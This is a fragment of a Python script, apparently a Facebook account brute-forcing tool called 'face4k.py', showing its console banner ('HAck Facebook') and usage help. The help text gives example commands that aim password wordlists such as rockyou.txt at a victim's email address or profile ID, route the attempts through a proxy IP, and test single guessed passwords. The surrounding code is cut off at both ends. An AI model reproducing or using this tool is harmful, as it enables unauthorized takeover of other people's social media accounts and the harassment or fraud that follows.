...
[>] ProxyStatus :> """+str(proxystatus)+wi)
        if not self.single_passwd:
            print(gr+"""\
=================================="""+wi+"""
[~] """+yl+"""Brute"""+rd+""" A/S Taem| ATTACK: """+gr+"""HAck Facebook"""+wi+"""[~]"""+gr+"""
==================================\n"""+wi)
...
Usage: python ./face4k.py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------
...
Examples:
        |
     |--------
     | python face4k.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python face4k.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python face4k.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
     |--------
     | python face4k.py -t Victim@gmail.com -s 1234567
     |--------
     | python face4k.py -g https://www.facebook.com/Victim_Profile
     |--------
""")
